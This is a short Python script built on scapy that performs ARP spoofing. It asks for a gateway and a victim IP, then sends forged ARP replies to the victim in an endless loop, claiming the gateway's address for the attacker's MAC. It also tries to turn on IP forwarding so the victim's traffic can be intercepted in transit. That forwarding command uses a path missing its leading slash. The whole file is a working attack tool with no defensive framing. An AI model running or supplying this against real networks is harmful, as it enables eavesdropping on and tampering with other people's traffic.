from scapy.all import *
import uuid
import os

def get_self_mac():
    mac = uuid.UUID(int = uuid.getnode()).hex[-12:]
    print(mac)
    return ':'.join(mac[e:e+2] for e in range(0, 11, 2))

def arp_spoof():
    gateway_ipv4 = input('Gateway IPv4 : ') # Gateway
    misleading_ipv4 = input('Misleading IP : ') # Victim
    mlmac = getmacbyip(misleading_ipv4)
    eth_packet = Ether(dst=mlmac)
    arp_packet = ARP(op=2, hwsrc=get_self_mac(), psrc=gateway_ipv4, hwdst=mlmac, pdst=misleading_ipv4)
    pkt = eth_packet/arp_packet
    sendp(pkt, inter=2, loop=1)

if __name__ == '__main__':
    os.system('echo 1 > proc/sys/net/ipv4/ip_forward')
    arp_spoof()